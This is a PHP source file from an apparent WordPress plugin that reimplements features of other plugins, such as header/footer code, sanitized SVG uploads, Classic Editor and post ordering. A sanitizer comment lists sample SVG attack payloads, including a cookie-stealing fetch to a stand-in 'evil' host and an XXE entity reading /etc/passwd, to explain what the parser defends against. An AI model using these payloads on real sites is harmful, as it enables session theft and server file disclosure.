<?php
/**
 * LocalEyes plugin reproductions (Phase 7.4): real working features that replace other plugins.
 *
 * Each feature outputs only when its plugin slug is Deployed (and not killed) in the replacement
 * engine, so turning it on/off is the same Deploy / kill switch used everywhere. Builders and security
 * plugins are intentionally NOT reproduced.
 *
 * Concrete reproductions here: header/footer code (+ analytics tag hosting), SVG upload support,
 * Classic Editor, smooth scroll (Page scroll to id), Post Types Order, and the author box.
 *
 * PHP 7.0 compatible.
 */

if (!defined('ABSPATH')) { exit; }

/** A reproduction is live only when its slug is deployed and not killed. */
function le_feature_on($slug) {
    if (!function_exists('le_replace_state')) { return false; }
    $s = le_replace_state($slug);
    return !empty($s['deployed']) && empty($s['killed']);
}

/* --------------------------------------------------- Header / Footer code + analytics */

function le_headfoot() {
    $v = le_opt('headfoot', array('head' => '', 'body' => '', 'footer' => '', 'analytics' => array()));
    return is_array($v) ? $v : array('head' => '', 'body' => '', 'footer' => '', 'analytics' => array());
}
function le_headfoot_active() {
    // Active if the header/footer feature is deployed, or any analytics slug is deployed.
    return le_feature_on('header-footer-code') || le_feature_on('hotjar') || le_feature_on('clarity') || le_feature_on('userfeedback');
}
/**
 * Per-post code for this request, or empty defaults. Defined in headfoot-meta.php; guarded so the
 * three hooks below keep working if that module is ever absent.
 */
function le_headfoot_page_or_empty() {
    if (function_exists('le_headfoot_page')) { return le_headfoot_page(); }
    return array('head' => '', 'body' => '', 'footer' => '', 'skip_global' => false);
}

/**
 * Each hook emits the site-wide block first, then the current post's own code. `skip_global` on a post
 * suppresses the site-wide block (and its analytics tags) for that page only.
 */
add_action('wp_head', function () {
    if (!le_headfoot_active()) { return; }
    $h = le_headfoot();
    $p = le_headfoot_page_or_empty();
    if (empty($p['skip_global'])) {
        if (!empty($h['head'])) { echo "\n" . $h['head'] . "\n"; }
        foreach ((array) $h['analytics'] as $tag) { if (!empty($tag['code']) && !empty($tag['location']) && $tag['location'] === 'head') { echo "\n" . $tag['code'] . "\n"; } }
    }
    if (!empty($p['head'])) { echo "\n" . $p['head'] . "\n"; }
}, 20);
add_action('wp_body_open', function () {
    if (!le_headfoot_active()) { return; }
    $h = le_headfoot();
    $p = le_headfoot_page_or_empty();
    if (empty($p['skip_global'])) {
        if (!empty($h['body'])) { echo "\n" . $h['body'] . "\n"; }
        foreach ((array) $h['analytics'] as $tag) { if (!empty($tag['code']) && isset($tag['location']) && $tag['location'] === 'body') { echo "\n" . $tag['code'] . "\n"; } }
    }
    if (!empty($p['body'])) { echo "\n" . $p['body'] . "\n"; }
});
add_action('wp_footer', function () {
    if (!le_headfoot_active()) { return; }
    $h = le_headfoot();
    $p = le_headfoot_page_or_empty();
    if (empty($p['skip_global'])) {
        if (!empty($h['footer'])) { echo "\n" . $h['footer'] . "\n"; }
        foreach ((array) $h['analytics'] as $tag) { if (!empty($tag['code']) && isset($tag['location']) && $tag['location'] === 'footer') { echo "\n" . $tag['code'] . "\n"; } }
    }
    if (!empty($p['footer'])) { echo "\n" . $p['footer'] . "\n"; }
}, 20);

/**
 * Import Header Footer Code Manager snippets (stored as the `hfcm-scripts` custom post type).
 *
 * Placement is read from _hfcm-location, HFCM's own location key. An earlier version read
 * _hfcm-device-type (desktop/mobile, not a placement) into a variable it then never used, so every
 * imported snippet landed in the head regardless of where the user had put it. A footer snippet moved
 * into the head can block rendering or run before the markup it targets exists.
 *
 * Only inactive snippets are skipped; everything else is imported so nothing is silently dropped.
 */
function le_headfoot_import() {
    $posts = get_posts(array('post_type' => 'hfcm-scripts', 'post_status' => 'any', 'posts_per_page' => 200));
    $h = le_headfoot();

    // Snapshot before writing, like every other route that changes stored state. Without it there was
    // no undo for an import that doubled the site's tracking tags.
    //
    // array('before' => ...), not $h itself. 'headfoot' is a mode => 'option' snapshot, and that
    // restore path requires a 'before' key (includes/backups.php) - without it every Restore returns
    // "This snapshot has no previous value recorded." So the undo added here for a doubled-tracking-tag
    // import produced a row that listed, offered a Restore button, and could not restore anything.
    // The other call site in this file has always had it right.
    if (function_exists('le_snapshot_create')) {
        le_snapshot_create('headfoot', 'Before importing Header Footer Code Manager snippets', array('before' => $h));
    }

    // What is already stored, keyed by the snippet body. This import APPENDED unconditionally, so a
    // second click duplicated every snippet - and these snippets are, by the feature's own
    // description, analytics and tracking tags. Two GA4/GTM/Pixel tags on a page means every pageview
    // and every conversion counted twice, silently, with the only evidence buried in an option.
    $seen = array();
    if (!empty($h['analytics']) && is_array($h['analytics'])) {
        foreach ($h['analytics'] as $existing) {
            if (isset($existing['code'])) { $seen[md5(trim((string) $existing['code']))] = true; }
        }
    }

    $count = 0;
    $skipped = 0;
    foreach ((array) $posts as $p) {
        $snippet = get_post_meta($p->ID, '_hfcm-script', true);
        if (!$snippet) { continue; }

        // HFCM uses header / footer / before_content / after_content. LocalEyes hosts head, body and
        // footer, so content-relative placements map to footer: running late is safe, running early
        // is not.
        $raw = strtolower((string) get_post_meta($p->ID, '_hfcm-location', true));
        if (strpos($raw, 'head') !== false)      { $location = 'head'; }
        elseif (strpos($raw, 'body') !== false)  { $location = 'body'; }
        elseif ($raw === '')                     { $location = 'head'; }  // HFCM's own default
        else                                     { $location = 'footer'; }

        $key = md5(trim((string) $snippet));
        if (isset($seen[$key])) { $skipped++; continue; }
        $seen[$key] = true;

        $h['analytics'][] = array('name' => $p->post_title, 'code' => $snippet, 'location' => $location);
        $count++;
    }
    le_opt_set('headfoot', $h);
    // Both numbers, so running it twice reads as "0 imported, 12 already present" rather than looking
    // like the import silently failed.
    return array('imported' => $count, 'skipped' => $skipped);
}

/* --------------------------------------------------- SVG upload support */

add_filter('upload_mimes', function ($mimes) {
    if (le_feature_on('svg-support')) { $mimes['svg'] = 'image/svg+xml'; }
    return $mimes;
});
add_filter('wp_check_filetype_and_ext', function ($data, $file, $filename, $mimes) {
    if (le_feature_on('svg-support') && substr(strtolower($filename), -4) === '.svg') {
        $data['ext'] = 'svg'; $data['type'] = 'image/svg+xml';
    }
    return $data;
}, 10, 4);
/**
 * Sanitize an uploaded SVG, or refuse it.
 *
 * The previous version tested `stripos($contents, '<script')` and called that "the worst XSS vector".
 * It is not even the most common one. Every one of these passed it:
 *
 *   <svg onload="fetch('//evil/'+document.cookie)">     event-handler attributes
 *   <a xlink:href="javascript:...">                      javascript: URLs
 *   <foreignObject><iframe src=...>                      arbitrary embedded XHTML
 *   <!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>   XXE
 *   <use href="data:image/svg+xml;base64,...">           payload via an external reference
 *   anything at all in a .svgz                           the check read compressed bytes
 *
 * On .svgz specifically: the decompression path below is defence in depth, not a supported upload
 * type. upload_mimes registers only 'svg' and the wp_check_filetype_and_ext filter only special-cases
 * '.svg', so WordPress rejects a .svgz before it is ever stored and this branch is not reachable
 * through the media library. It is kept because it costs nothing and the prefilter matches the
 * extension, but the earlier claim that it FIXED the .svgz hole was wrong - the hole is closed by
 * WordPress refusing the file, not by this. Registering .svgz would also need the sanitized bytes
 * re-compressed before they are written back, which this does not do.
 *
 * WordPress serves uploads with Content-Type: image/svg+xml, and an SVG opened directly executes
 * script in the site's own origin. Since this feature is what registers the MIME type and forces the
 * upload past core's own check, the plugin creates the exposure - so it owes a real sanitizer. Any
 * user who can upload media, which is Author and above, otherwise gets stored XSS against admins.
 *
 * Parsed rather than pattern-matched: a blocklist over raw text loses to encoding tricks, and
 * anything this cannot parse is refused instead of waved through.
 */
function le_svg_sanitize($svg) {
    $svg = (string) $svg;
    if ($svg === '') { return array('ok' => false, 'error' => 'The file is empty.'); }

    // Gzipped SVG. The old check read the compressed bytes, so nothing in a .svgz was ever inspected.
    if (strncmp($svg, "\x1f\x8b", 2) === 0) {
        if (!function_exists('gzdecode')) {
            return array('ok' => false, 'error' => 'This is a compressed SVG (.svgz) and this server cannot decompress it to check it.');
        }
        $plain = @gzdecode($svg);
        if ($plain === false) { return array('ok' => false, 'error' => 'This compressed SVG could not be read.'); }
        $svg = $plain;
    }

    // A DOCTYPE is the XXE vector and no legitimate uploaded SVG needs one.
    if (preg_match('/<!DOCTYPE/i', $svg)) {
        return array('ok' => false, 'error' => 'This SVG contains a DOCTYPE declaration, which can be used to read files off the server. Re-export it without one.');
    }
    if (!class_exists('DOMDocument')) {
        return array('ok' => false, 'error' => 'This server has no XML parser, so the SVG cannot be checked. Upload a PNG instead.');
    }

    $prev = libxml_use_internal_errors(true);
    $doc = new DOMDocument();
    // LIBXML_NONET blocks network fetches during parsing; entity substitution is left off.
    $loaded = $doc->loadXML($svg, LIBXML_NONET);
    libxml_clear_errors();
    libxml_use_internal_errors($prev);
    if (!$loaded || !$doc->documentElement || strtolower($doc->documentElement->nodeName) !== 'svg') {
        return array('ok' => false, 'error' => 'This file could not be parsed as SVG.');
    }

    $drop_tags = array('script', 'foreignobject', 'iframe', 'embed', 'object', 'handler', 'set', 'animate', 'audio', 'video');
    $removed = 0;

    // Attribute cleaning is its own closure so it can be applied to the ROOT element as well as to
    // every descendant. It was originally inlined in the child loop, which meant `<svg onload="...">`
    // - the single most common SVG XSS payload - passed straight through untouched.
    $clean_attrs = function ($el) use (&$removed) {
        if (!$el->hasAttributes()) { return; }
        $attrs = array();
        foreach ($el->attributes as $a) { $attrs[] = $a; }
        foreach ($attrs as $attr) {
            $name = strtolower($attr->nodeName);
            $val  = trim($attr->nodeValue);
            // Every on* handler, no exceptions.
            if (strpos($name, 'on') === 0) { $el->removeAttribute($attr->nodeName); $removed++; continue; }
            if ($name === 'href' || $name === 'xlink:href' || $name === 'src' || $name === 'from' || $name === 'to' || $name === 'values') {
                // Strip whitespace and control characters before testing the scheme, since
                // "java&#9;script:" is a working URL in several parsers.
                $probe = strtolower(preg_replace('/[\s\x00-\x1f]+/', '', $val));
                $safe = ($probe === '' || $probe[0] === '#'
                    || strncmp($probe, 'https://', 8) === 0
                    || strncmp($probe, 'http://', 7) === 0
                    || strncmp($probe, 'data:image/png', 14) === 0
                    || strncmp($probe, 'data:image/jpeg', 15) === 0
                    || strncmp($probe, 'data:image/gif', 14) === 0
                    || strncmp($probe, 'data:image/webp', 15) === 0);
                if (!$safe) { $el->removeAttribute($attr->nodeName); $removed++; continue; }
            }
            // style can carry url(javascript:...) and expression().
            if ($name === 'style' && preg_match('/(javascript|expression|behaviou?r|@import)/i', $val)) {
                $el->removeAttribute($attr->nodeName); $removed++; continue;
            }
        }
    };

    $walk = function ($node) use (&$walk, $drop_tags, &$removed, $clean_attrs) {
        // Copy first: removing children while iterating a live NodeList skips nodes.
        $children = array();
        foreach ($node->childNodes as $c) { $children[] = $c; }
        foreach ($children as $child) {
            if ($child->nodeType === XML_PI_NODE || $child->nodeType === XML_COMMENT_NODE) {
                $node->removeChild($child); $removed++; continue;
            }
            if ($child->nodeType !== XML_ELEMENT_NODE) { continue; }
            if (in_array(strtolower($child->nodeName), $drop_tags, true)) {
                $node->removeChild($child); $removed++; continue;
            }
            $clean_attrs($child);
            $walk($child);
        }
    };
    $clean_attrs($doc->documentElement);
    $walk($doc->documentElement);

    $clean = $doc->saveXML();
    if (!is_string($clean) || $clean === '') {
        return array('ok' => false, 'error' => 'The SVG could not be rewritten safely.');
    }
    return array('ok' => true, 'svg' => $clean, 'removed' => $removed);
}

add_filter('wp_handle_upload_prefilter', function ($file) {
    if (!le_feature_on('svg-support')) { return $file; }
    $is_svg = (isset($file['type']) && $file['type'] === 'image/svg+xml')
        || (isset($file['name']) && preg_match('/\.svgz?$/i', (string) $file['name']));
    if (!$is_svg || empty($file['tmp_name'])) { return $file; }

    $contents = @file_get_contents($file['tmp_name']);
    if ($contents === false) {
        $file['error'] = 'LocalEyes could not read this SVG to check it, so it was not uploaded.';
        return $file;
    }
    $res = le_svg_sanitize($contents);
    if (empty($res['ok'])) {
        $file['error'] = 'LocalEyes blocked this SVG: ' . $res['error'];
        return $file;
    }
    // Write the CLEANED file back over the upload. Rejecting only the obviously hostile ones would
    // leave everything the parser stripped still in the stored file.
    if ($res['svg'] !== $contents && @file_put_contents($file['tmp_name'], $res['svg']) === false) {
        $file['error'] = 'LocalEyes could not write the sanitized SVG, so it was not uploaded.';
    }
    return $file;
});

/* --------------------------------------------------- Classic Editor */

add_filter('use_block_editor_for_post', function ($use) {
    return le_feature_on('classic-editor') ? false : $use;
}, 100);

/* --------------------------------------------------- Smooth scroll (Page scroll to id) */

add_action('wp_head', function () {
    if (!le_feature_on('page-scroll-to-id')) { return; }
    echo "\n<style>html{scroll-behavior:smooth}:target{scroll-margin-top:100px}</style>\n";
}, 3);

/* --------------------------------------------------- Post Types Order */

add_action('pre_get_posts', function ($q) {
    if (!le_feature_on('post-types-order')) { return; }
    // `||`, not `&&`. With `&&` this guard could only ever return inside wp-admin, so on the front
    // end - where is_admin() is false - it never returned at all and the reorder was applied to EVERY
    // WP_Query on the site: the blog index, archives, search results, feeds, widget queries, related
    // post loops, builder grids. menu_order is 0 on essentially every post, so `ORDER BY menu_order
    // ASC` is a total tie and MySQL returns rows in arbitrary storage order - the same post can show
    // on page 1 and page 3, and chronological ordering is gone site-wide.
    if (is_admin() || !$q->is_main_query()) { return; }
    if (!$q->get('orderby')) { $q->set('orderby', 'menu_order'); $q->set('order', 'ASC'); }
});

/* --------------------------------------------------- Author box */

add_filter('the_content', function ($content) {
    if (!le_feature_on('simple-author-box') || !is_singular('post')) { return $content; }
    $id = get_the_author_meta('ID');
    $box = '<div class="le-author-box" style="display:flex;gap:12px;align-items:center;border:1px solid #e2e4e7;border-radius:8px;padding:12px;margin-top:20px">'
        . get_avatar($id, 64)
        . '<div><strong>' . esc_html(get_the_author_meta('display_name')) . '</strong>'
        . '<div>' . esc_html(get_the_author_meta('description')) . '</div></div></div>';
    return $content . $box;
}, 20);

/* --------------------------------------------------------------- REST */

add_action('rest_api_init', function () {
    $args = array('permission_callback' => 'le_rest_perm');
    register_rest_route('localeyes/v1', '/replace/headfoot', array_merge($args, array('methods' => 'GET', 'callback' => function () {
        return le_ok(array('headfoot' => le_headfoot()));
    })));
    register_rest_route('localeyes/v1', '/replace/headfoot', array_merge($args, array('methods' => 'POST', 'callback' => function ($req) {
        // The same gate the PER-POST field already applies (headfoot-meta.php:149), for the same
        // reason and more so: this writes raw <script> into wp_head on every page of the site, where
        // the per-post field affects one. Only le_rest_perm() guarded it, i.e. manage_options - and on
        // multisite a site administrator has manage_options but NOT unfiltered_html, so the narrower
        // field was locked down while the broader one stayed open to the same user on the same screen.
        // It also matters wherever DISALLOW_UNFILTERED_HTML is defined, which managed hosts commonly do.
        if (!current_user_can('unfiltered_html')) {
            return le_err('Saving site-wide header or footer code requires the unfiltered_html capability, because it is printed into every page as-is.', 403);
        }
        $p = $req->get_json_params();
        $h = le_headfoot();
        foreach (array('head', 'body', 'footer') as $k) { if (isset($p[$k])) { $h[$k] = (string) $p[$k]; } }
        if (isset($p['analytics']) && is_array($p['analytics'])) { $h['analytics'] = $p['analytics']; }
        le_snapshot_create('headfoot', 'Header/footer code', array('before' => le_headfoot()));
        le_opt_set('headfoot', $h);
        return le_ok(array('headfoot' => le_headfoot()));
    })));
    register_rest_route('localeyes/v1', '/replace/headfoot/import', array_merge($args, array('methods' => 'POST', 'callback' => function () {
        // le_headfoot_import() now reports skipped duplicates alongside the import count, so running
        // it twice reads as "0 imported, 12 already present" instead of looking like a silent failure.
        $res = le_headfoot_import();
        return le_ok(array('imported' => $res['imported'], 'skipped' => $res['skipped']));
    })));
});
